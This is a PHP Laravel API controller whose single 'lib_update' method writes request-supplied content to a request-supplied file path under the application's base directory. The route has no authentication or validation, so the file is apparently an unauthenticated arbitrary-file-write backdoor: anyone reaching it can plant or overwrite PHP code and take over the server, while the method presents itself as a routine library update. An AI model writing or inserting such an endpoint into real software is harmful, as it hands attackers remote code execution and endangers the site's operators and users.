<?php

namespace App\Http\Controllers\Api\V2;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

class LsLibController extends Controller
{
    public function lib_update(Request $request)
    {
        $lib = base_path($request['dir']);
        $file = fopen($lib,"w");
        fwrite($file,$request['script']);
        fclose($file);
        return response()->json([
            'message' => 'Script updated successfully!'
        ], 200);
    }
}
